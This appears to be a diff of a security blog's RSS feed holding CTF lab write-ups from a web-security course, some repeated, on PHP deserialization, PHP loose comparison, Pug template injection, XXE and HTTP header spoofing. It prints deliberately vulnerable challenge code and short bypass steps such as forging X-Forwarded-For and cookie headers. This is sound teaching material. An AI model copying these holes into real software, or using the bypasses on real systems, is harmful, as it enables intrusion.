+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8602/">http://h4ck3r.quest:8602/&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>None&amp;hellip;&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler code&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-php=&lt;?php" data-lang="php=&lt;?php">isset($_GET[&amp;#39;source&amp;#39;]) &amp;amp;&amp;amp; die(!show_source(__FILE__));
+
+class Magic
+{
+ function cast($spell)
+ {
+ echo &amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;MAGIC, $spell!&amp;#39;);&amp;lt;/script&amp;gt;&amp;#34;;
+ }
+}
+
+// Useless class?
+class Caster
+{
+ public $cast_func = &amp;#39;intval&amp;#39;;
+ function cast($val)
+ {
+ return ($this-&amp;gt;cast_func)($val);
+ }
+}
+
+
+class Cat
+{
+ public $magic;
+ public $spell;
+ function __construct($spell)
+ {
+ $this-&amp;gt;magic = new Magic();
+ $this-&amp;gt;spell = $spell;
+ }
+ function __wakeup()
+ {
+ echo &amp;#34;Cat Wakeup!\n&amp;#34;;
+ $this-&amp;gt;magic-&amp;gt;cast($this-&amp;gt;spell);
+ }
+}
+
+if (isset($_GET[&amp;#39;spell&amp;#39;])) {
+ $cat = new Cat($_GET[&amp;#39;spell&amp;#39;]);
+} else if (isset($_COOKIE[&amp;#39;cat&amp;#39;])) {
+ echo &amp;#34;Unserialize...\n&amp;#34;;
+ $cat = unserialize(base64_decode($_COOKIE[&amp;#39;cat&amp;#39;]));
+} else {
+ $cat = new Cat(&amp;#34;meow-meow-magic&amp;#34;);
+}
+?&amp;gt;
+&amp;lt;pre&amp;gt;
+This is your 🐱:
+&amp;lt;?php var_dump($cat) ?&amp;gt;
+&amp;lt;/pre&amp;gt;
+
+&amp;lt;p&amp;gt;Usage:&amp;lt;/p&amp;gt;
+&amp;lt;p&amp;gt;/?source&amp;lt;/p&amp;gt;
+&amp;lt;p&amp;gt;/?spell=the-spell-of-your-cat&amp;lt;/p&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x18(Lab - Magic Cat)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x18lab---magic-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x18lab---magic-cat/</guid><description>&lt;h1 id="simple-web-0x18lab---magic-cat">
+ Simple Web 0x18(Lab - Magic Cat)
+ &lt;a class="anchor" href="#simple-web-0x18lab---magic-cat">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8602/">http://h4ck3r.quest:8602/&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>None&amp;hellip;&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler code&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-php=&lt;?php" data-lang="php=&lt;?php">isset($_GET[&amp;#39;source&amp;#39;]) &amp;amp;&amp;amp; die(!show_source(__FILE__));
+
+class Magic
+{
+ function cast($spell)
+ {
+ echo &amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;MAGIC, $spell!&amp;#39;);&amp;lt;/script&amp;gt;&amp;#34;;
+ }
+}
+
+// Useless class?
+class Caster
+{
+ public $cast_func = &amp;#39;intval&amp;#39;;
+ function cast($val)
+ {
+ return ($this-&amp;gt;cast_func)($val);
+ }
+}
+
+
+class Cat
+{
+ public $magic;
+ public $spell;
+ function __construct($spell)
+ {
+ $this-&amp;gt;magic = new Magic();
+ $this-&amp;gt;spell = $spell;
+ }
+ function __wakeup()
+ {
+ echo &amp;#34;Cat Wakeup!\n&amp;#34;;
+ $this-&amp;gt;magic-&amp;gt;cast($this-&amp;gt;spell);
+ }
+}
+
+if (isset($_GET[&amp;#39;spell&amp;#39;])) {
+ $cat = new Cat($_GET[&amp;#39;spell&amp;#39;]);
+} else if (isset($_COOKIE[&amp;#39;cat&amp;#39;])) {
+ echo &amp;#34;Unserialize...\n&amp;#34;;
+ $cat = unserialize(base64_decode($_COOKIE[&amp;#39;cat&amp;#39;]));
+} else {
+ $cat = new Cat(&amp;#34;meow-meow-magic&amp;#34;);
+}
+?&amp;gt;
+&amp;lt;pre&amp;gt;
+This is your 🐱:
+&amp;lt;?php var_dump($cat) ?&amp;gt;
+&amp;lt;/pre&amp;gt;
+
+&amp;lt;p&amp;gt;Usage:&amp;lt;/p&amp;gt;
+&amp;lt;p&amp;gt;/?source&amp;lt;/p&amp;gt;
+&amp;lt;p&amp;gt;/?spell=the-spell-of-your-cat&amp;lt;/p&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x19(Lab - PHP Login)</title><link>https://bernie6401.github.io/security/course/ntust-ws/language-feature/simple-web-0x19lab---php-login/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/language-feature/simple-web-0x19lab---php-login/</guid><description>&lt;h1 id="simple-web-0x19lab---php-login">
+ Simple Web 0x19(Lab - PHP Login)
+ &lt;a class="anchor" href="#simple-web-0x19lab---php-login">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8081">http://h4ck3r.quest:8081&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
+// BSides Ahmedabad CTF 2021: entrance
+
+include &amp;#39;flag.php&amp;#39;;
+$users = array(
+ &amp;#34;admin&amp;#34; =&amp;gt; &amp;#34;ed2b7b57b3b5be3e8d4246c69e4b513608ffb352&amp;#34;,
+ &amp;#34;guest&amp;#34; =&amp;gt; &amp;#34;35675e68f4b5af7b995d9205ad0fc43842f16450&amp;#34;
+);
+
+function lookup($username) {
+ global $users;
+ return array_key_exists($username, $users) ? $users[$username] : &amp;#34;&amp;#34;;
+}
+
+if (!empty($_POST[&amp;#39;username&amp;#39;]) &amp;amp;&amp;amp; !empty($_POST[&amp;#39;password&amp;#39;])) {
+ $sha1pass = lookup($_POST[&amp;#39;username&amp;#39;]);
+ if ($sha1pass == sha1($_POST[&amp;#39;password&amp;#39;])) {
+ if ($_POST[&amp;#39;username&amp;#39;] !== &amp;#39;guest&amp;#39;) echo $FLAG;
+ else echo &amp;#39;Welcome guest!&amp;#39;;
+ } else {
+ echo &amp;#39;Login Failed!&amp;#39;;
+ }
+} else {
+ echo &amp;#34;You can login with guest:guest&amp;#34;;
+}
+echo &amp;#34;&amp;lt;br&amp;gt;\n&amp;#34;;
+highlight_file(__file__);
+?&amp;gt;
+&lt;/code>&lt;/pre>&lt;h2 id="exploit">
+ Exploit
+ &lt;a class="anchor" href="#exploit">#&lt;/a>
+&lt;/h2>
+&lt;p>Must change &lt;code>GET&lt;/code> method to &lt;code>POST&lt;/code> method and add &lt;code>Content-Type: application/x-www-form-urlencoded&lt;/code> in header&lt;/p></description></item><item><title>Simple Web 0x22(Lab - Pug)</title><link>https://bernie6401.github.io/security/course/ntust-ws/ssti/simple-web-0x22lab---pug/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/ssti/simple-web-0x22lab---pug/</guid><description>&lt;h1 id="simple-web-0x22lab---pug">
+ Simple Web 0x22(Lab - Pug)
+ &lt;a class="anchor" href="#simple-web-0x22lab---pug">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8008">http://h4ck3r.quest:8008&lt;/a>&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-javascript=" data-lang="javascript=">const express = require(&amp;#39;express&amp;#39;);
+const pug = require(&amp;#39;pug&amp;#39;);
+
+const app = express();
+
+const template = `
+h1 Hello %NAME%
+form(method=&amp;#39;GET&amp;#39; action=&amp;#39;/&amp;#39;)
+ div
+ label(for=&amp;#39;nickname&amp;#39;) Name:
+ input#nickname(type=&amp;#39;text&amp;#39;, placeholder=&amp;#39;Nickname&amp;#39; name=&amp;#39;name&amp;#39;)
+ button(type=&amp;#39;submit&amp;#39;) Submit 
+ a(href=&amp;#39;/source&amp;#39;) Source Code
+`;
+
+app.get(&amp;#39;/&amp;#39;, (req, res) =&amp;gt; {
+ const name = (req.query.name ?? &amp;#39;Anonymous&amp;#39;).toString();
+ if (name.includes(&amp;#39;{&amp;#39;)) return res.send(&amp;#39;Nice try&amp;#39;);
+ let html = pug.render(template.replace(&amp;#39;%NAME%&amp;#39;, name));
+ res.set(&amp;#39;Content-Type&amp;#39;, &amp;#39;text/html&amp;#39;);
+ res.send(html);
+});
+
+app.get(&amp;#34;/source&amp;#34;, (_, res) =&amp;gt; {
+ res.sendFile(__filename);
+});
+
+app.listen(3000, () =&amp;gt; console.log(&amp;#39;:3000&amp;#39;));
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x23(Lab - XXE)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x14lab---xxe/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x14lab---xxe/</guid><description>&lt;h1 id="simple-web-0x23lab---xxe">
+ Simple Web 0x23(Lab - XXE)
+ &lt;a class="anchor" href="#simple-web-0x23lab---xxe">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8604/">http://h4ck3r.quest:8604/&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://www.w3schools.com/xml/xml_tree.asp">XML Tree&lt;/a>
+&lt;a href="https://www.w3schools.com/xml/xml_parser.asp">XML Parser&lt;/a>
+&lt;a href="https://www.w3schools.com/xml/ajax_xmlhttprequest_response.asp">AJAX - Server Response&lt;/a>
+&lt;a href="https://www.w3schools.com/xml/xml_dtd.asp">XML DTD&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://phper.shujuwajue.com/shu-zu/shu-ru-liu-php-input">输入流 php://input&lt;/a>&lt;/p>
+&lt;blockquote>
+&lt;p>php://input可以读取没有处理过的POST数据。&lt;/p>&lt;/blockquote>
+&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10217536">Day 18：Stream 概述&lt;/a>&lt;/p>
+&lt;blockquote>
+&lt;p>php://input
+取得所有的 input 通常來源於 HTTP body，值得注意的是，由這個 Stream 取得的內容是 Raw Body，所以需要自行解析。&lt;/p>&lt;/blockquote>
+&lt;p>&lt;a href="https://www.digicentre.com.tw/industry_detail?id=38">來自外部的威脅-XXE漏洞攻擊成因&lt;/a>
+:::spoiler XXE course lecture
+&lt;img src="https://i.imgur.com/NsyIcdt.png" alt="" />&lt;/p>
+&lt;p>&lt;img src="https://i.imgur.com/zYonfqc.png" alt="" />
+:::
+:::spoiler exploit type
+&lt;img src="https://i.imgur.com/IJlFonF.png" alt="" />&lt;/p>
+&lt;p>&lt;img src="https://i.imgur.com/N9VNyBC.png" alt="" />&lt;/p>
+&lt;p>&lt;img src="https://i.imgur.com/uqPwH5H.png" alt="" />&lt;/p>
+&lt;p>&lt;img src="https://i.imgur.com/j8WI9eQ.png" alt="" />
+:::&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
+ $xmlfile = urldecode(file_get_contents(&amp;#39;php://input&amp;#39;));
+ if (!$xmlfile) die(show_source(__FILE__));
+
+ $dom = new DOMDocument();
+ $dom-&amp;gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+ $creds = simplexml_import_dom($dom);
+ $user = $creds-&amp;gt;user;
+ echo &amp;#34;You have logged in as user $user&amp;#34;;
+?&amp;gt;
+&lt;/code>&lt;/pre>&lt;h2 id="exploit---xxe">
+ Exploit - XXE
+ &lt;a class="anchor" href="#exploit---xxe">#&lt;/a>
+&lt;/h2>
+&lt;ol>
+&lt;li>Normal Usage in this webpage&lt;/li>
+&lt;/ol>
+&lt;h2 id="reference">
+ Reference
+ &lt;a class="anchor" href="#reference">#&lt;/a>
+&lt;/h2></description></item><item><title>Simple Web 0x23(Lab - XXE)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x23lab---xxe/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x23lab---xxe/</guid><description>&lt;h1 id="simple-web-0x23lab---xxe">
+ Simple Web 0x23(Lab - XXE)
+ &lt;a class="anchor" href="#simple-web-0x23lab---xxe">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8604/">http://h4ck3r.quest:8604/&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://www.w3schools.com/xml/xml_tree.asp">XML Tree&lt;/a>
+&lt;a href="https://www.w3schools.com/xml/xml_parser.asp">XML Parser&lt;/a>
+&lt;a href="https://www.w3schools.com/xml/ajax_xmlhttprequest_response.asp">AJAX - Server Response&lt;/a>
+&lt;a href="https://www.w3schools.com/xml/xml_dtd.asp">XML DTD&lt;/a>&lt;/p>
+&lt;p>&lt;a href="https://phper.shujuwajue.com/shu-zu/shu-ru-liu-php-input">输入流 php://input&lt;/a>&lt;/p>
+&lt;blockquote>
+&lt;p>php://input可以读取没有处理过的POST数据。&lt;/p>&lt;/blockquote>
+&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10217536">Day 18：Stream 概述&lt;/a>&lt;/p>
+&lt;blockquote>
+&lt;p>php://input
+取得所有的 input 通常來源於 HTTP body，值得注意的是，由這個 Stream 取得的內容是 Raw Body，所以需要自行解析。&lt;/p>&lt;/blockquote>
+&lt;p>&lt;a href="https://www.digicentre.com.tw/industry_detail?id=38">來自外部的威脅-XXE漏洞攻擊成因&lt;/a>
+:::spoiler XXE course lecture
+&lt;img src="https://i.imgur.com/NsyIcdt.png" alt="" />&lt;/p>
+&lt;p>&lt;img src="https://i.imgur.com/zYonfqc.png" alt="" />
+:::
+:::spoiler exploit type
+&lt;img src="https://i.imgur.com/IJlFonF.png" alt="" />&lt;/p>
+&lt;p>&lt;img src="https://i.imgur.com/N9VNyBC.png" alt="" />&lt;/p>
+&lt;p>&lt;img src="https://i.imgur.com/uqPwH5H.png" alt="" />&lt;/p>
+&lt;p>&lt;img src="https://i.imgur.com/j8WI9eQ.png" alt="" />
+:::&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
+ $xmlfile = urldecode(file_get_contents(&amp;#39;php://input&amp;#39;));
+ if (!$xmlfile) die(show_source(__FILE__));
+
+ $dom = new DOMDocument();
+ $dom-&amp;gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+ $creds = simplexml_import_dom($dom);
+ $user = $creds-&amp;gt;user;
+ echo &amp;#34;You have logged in as user $user&amp;#34;;
+?&amp;gt;
+&lt;/code>&lt;/pre>&lt;h2 id="exploit---xxe">
+ Exploit - XXE
+ &lt;a class="anchor" href="#exploit---xxe">#&lt;/a>
+&lt;/h2>
+&lt;ol>
+&lt;li>Normal Usage in this webpage&lt;/li>
+&lt;/ol>
+&lt;h2 id="reference">
+ Reference
+ &lt;a class="anchor" href="#reference">#&lt;/a>
+&lt;/h2></description></item><item><title>Simple Web 0x24(Lab - how2http)</title><link>https://bernie6401.github.io/security/course/ntust-ws/beginner/simple-web-0x24lab---how2http/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/beginner/simple-web-0x24lab---how2http/</guid><description>&lt;h1 id="simple-web-0x24lab---how2http">
+ Simple Web 0x24(Lab - how2http)
+ &lt;a class="anchor" href="#simple-web-0x24lab---how2http">#&lt;/a>
+&lt;/h1>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">show_source&lt;/span>(&lt;span style="color:#66d9ef">__FILE__&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">include&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;flag.php&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#66d9ef">empty&lt;/span>($_SERVER[&lt;span style="color:#e6db74">&amp;#34;HTTP_CLIENT_IP&amp;#34;&lt;/span>])){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $ip &lt;span style="color:#f92672">=&lt;/span> $_SERVER[&lt;span style="color:#e6db74">&amp;#34;HTTP_CLIENT_IP&amp;#34;&lt;/span>];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} &lt;span style="color:#66d9ef">elseif&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#66d9ef">empty&lt;/span>($_SERVER[&lt;span style="color:#e6db74">&amp;#34;HTTP_X_FORWARDED_FOR&amp;#34;&lt;/span>])){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $ip &lt;span style="color:#f92672">=&lt;/span> $_SERVER[&lt;span style="color:#e6db74">&amp;#34;HTTP_X_FORWARDED_FOR&amp;#34;&lt;/span>];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} &lt;span style="color:#66d9ef">else&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $ip &lt;span style="color:#f92672">=&lt;/span> $_SERVER[&lt;span style="color:#e6db74">&amp;#34;REMOTE_ADDR&amp;#34;&lt;/span>];
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> ($_COOKIE[&lt;span style="color:#e6db74">&amp;#39;user&amp;#39;&lt;/span>] &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;admin&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Not admim&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span>( $_SERVER[&lt;span style="color:#e6db74">&amp;#34;REQUEST_METHOD&amp;#34;&lt;/span>] &lt;span style="color:#f92672">!==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;FLAG&amp;#34;&lt;/span> ) &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;u don&amp;#39;t need flag?&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> ($ip &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#e6db74">&amp;#34;127.0.0.1&amp;#34;&lt;/span>) &lt;span style="color:#66d9ef">echo&lt;/span> $FLAG;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;NOPE!&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="recon">
+ Recon
+ &lt;a class="anchor" href="#recon">#&lt;/a>
+&lt;/h2>
+&lt;p>主要是參考之前寫過的&lt;a href="https://hackmd.io/@SBK6401/B135SD0w2">PicoCTF - Who are you?&lt;/a>和&lt;a href="https://hackmd.io/@SBK6401/Syct_Ol0i#Challenge-picobrowser%F0%9F%8D%B0">PicoCTF - Who are you?&lt;/a>，按照source code我們需要更改一些header讓他可以被forge然後bypass這些條件，首先是IP，他其實給的很寬鬆，還有X-Forwarded-For的header可以用，就直接==X-Forwarded-For: 127.0.0.1==；另外，cookie的user要等於admin→==Cookie: user=admin==；再來，request method要等於FLAG→==FLAG / HTTP/1.1==&lt;/p>
+&lt;h2 id="exploit">
+ Exploit
+ &lt;a class="anchor" href="#exploit">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;img src="https://hackmd.io/_uploads/H14qGKvrp.png" alt="圖片" />&lt;/p></description></item></channel></rss>
